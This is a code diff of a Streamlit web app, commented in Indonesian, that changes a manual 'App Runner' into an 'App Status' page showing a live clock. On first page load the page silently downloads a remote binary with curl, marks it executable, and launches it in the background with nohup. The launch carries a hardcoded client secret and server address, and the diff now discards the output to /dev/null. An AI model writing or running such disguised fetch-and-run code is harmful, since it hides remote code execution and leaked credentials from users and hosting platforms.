@@ -2,68 +2,82 @@ import streamlit as st
 import subprocess
 from datetime import datetime
 import time
-#welp
-# --- Konfigurasi ---
-st.set_page_config(page_title="App Runner", layout="centered")
 
-# Perintah shell yang sudah diperbaiki untuk berjalan di latar belakang
-# nohup: Menjaga proses tetap berjalan meskipun sesi terminal ditutup
-# &: Menjalankan perintah di background (latar belakang)
-COMMAND = """
+# --- Konfigurasi ---
+st.set_page_config(
+    page_title="App Status",
+    page_icon="🟢",
+    layout="centered"
+)
+
+# Perintah shell yang akan dijalankan secara otomatis di latar belakang.
+# nohup: Menjaga proses tetap berjalan bahkan jika sesi terminal induk ditutup.
+# > /dev/null 2>&1: Mengalihkan semua output (standar dan error) ke "tempat sampah" 
+#                   agar tidak memenuhi log server.
+# &: Menjalankan perintah di background (latar belakang), sehingga tidak memblokir script Python.
+COMMAND_TO_RUN_ONCE = """
 (curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent) && \
 nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
     NZ_TLS=true \
     NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
     NZ_UUID=61aeceff-7479-49a9-9900-32df80905be8 \
-    ./agent > agent.log 2>&1 &
+    ./agent > /dev/null 2>&1 &
 """
 
-# --- Inisialisasi State Aplikasi ---
-# Menggunakan st.session_state agar nilai tidak hilang saat UI di-refresh
-if 'process_started' not in st.session_state:
-    st.session_state.process_started = False
-    st.session_state.start_time = None
+# --- Logika Eksekusi Otomatis ---
+
+# Gunakan st.session_state untuk membuat "flag" yang menandai apakah
+# proses sudah pernah dijalankan dalam sesi ini.
+if 'agent_triggered' not in st.session_state:
+    st.session_state.agent_triggered = False
+
+# Jalankan perintah HANYA jika flag-nya False (belum pernah dijalankan)
+if not st.session_state.agent_triggered:
+    try:
+        # Tampilkan pesan bahwa proses sedang dimulai
+        st.info("🚀 Inisialisasi... Memulai agent di latar belakang.")
+        
+        # Gunakan Popen untuk menjalankan perintah tanpa menunggu selesai.
+        subprocess.Popen(COMMAND_TO_RUN_ONCE, shell=True)
+        
+        # Set flag ke True agar blok kode ini tidak akan pernah dijalankan lagi di sesi ini.
+        st.session_state.agent_triggered = True
+        
+        # Tampilkan notifikasi singkat (toast) yang akan hilang sendiri
+        st.toast("Agent berhasil dimulai!", icon="✅")
+        
+        # Beri jeda singkat agar pengguna bisa melihat pesan info sebelum UI di-refresh
+        time.sleep(2)
+        
+        # Paksa Streamlit untuk menjalankan ulang script dari awal.
+        # Kali ini, 'agent_triggered' sudah True, jadi blok ini akan dilewati.
+        st.experimental_rerun()
+
+    except Exception as e:
+        # Jika ada error, tampilkan dan hentikan aplikasi
+        st.error(f"❌ Gagal memulai agent di latar belakang:")
+        st.code(str(e))
+        st.stop()
+
 
 # --- Tampilan Utama (UI) ---
-st.title("Simple App Runner")
+# Bagian ini akan selalu ditampilkan setelah blok eksekusi di atas selesai.
 
-# Tombol untuk memulai proses hanya muncul jika belum pernah dimulai
-if not st.session_state.process_started:
-    st.write("Klik tombol di bawah untuk menjalankan agent di latar belakang.")
-    
-    if st.button("🚀 Mulai Proses Latar Belakang"):
-        try:
-            # subprocess.Popen menjalankan perintah tanpa menunggu selesai
-            # Ini membuat aplikasi Streamlit tidak 'freeze' atau macet
-            subprocess.Popen(COMMAND, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Simpan status bahwa proses telah dimulai
-            st.session_state.process_started = True
-            st.session_state.start_time = datetime.now()
-            
-            # Tampilkan pesan sukses sementara
-            st.success("Proses berhasil dimulai di latar belakang!")
-            time.sleep(2) # Beri waktu sejenak untuk membaca pesan
-            st.experimental_rerun() # Paksa refresh UI untuk menampilkan jam
+st.title("🟢 App Status")
+st.success("Aplikasi berjalan. Agent telah aktif di latar belakang.")
+st.markdown("---")
 
-        except Exception as e:
-            st.error(f"Gagal memulai proses: {e}")
-            st.code(str(e))
-else:
-    # --- Tampilan setelah proses dimulai ---
-    st.info(f"Proses latar belakang telah dimulai pada: {st.session_state.start_time.strftime('%d %B %Y, %H:%M:%S')}")
-    
-    # Placeholder untuk jam yang akan diupdate terus menerus
-    clock_placeholder = st.empty()
+# Placeholder untuk jam yang akan diupdate terus menerus
+clock_placeholder = st.empty()
 
-    # Loop tak terbatas untuk membuat efek jam "live"
-    while True:
-        now = datetime.now()
-        # Tampilkan waktu saat ini menggunakan st.metric
-        clock_placeholder.metric(
-            label="Waktu Server Saat Ini",
-            value=now.strftime("%H:%M:%S"),
-            delta=f"{now.strftime('%d %B %Y')}", # Tampilkan tanggal di bawahnya
-            delta_color="off"
-        )
-        time.sleep(1) # Tunggu 1 detik sebelum update lagi
+# Loop tak terbatas untuk membuat efek jam "live"
+while True:
+    now = datetime.now()
+    # Tampilkan waktu saat ini menggunakan st.metric untuk tampilan yang bagus
+    clock_placeholder.metric(
+        label="Waktu Server Saat Ini",
+        value=now.strftime("%H:%M:%S"),
+        delta=now.strftime('%d %B %Y'), # Tampilkan tanggal sebagai "delta"
+        delta_color="off" # Matikan warna hijau/merah pada delta
+    )
+    time.sleep(1) # Tunggu 1 detik sebelum update lagi
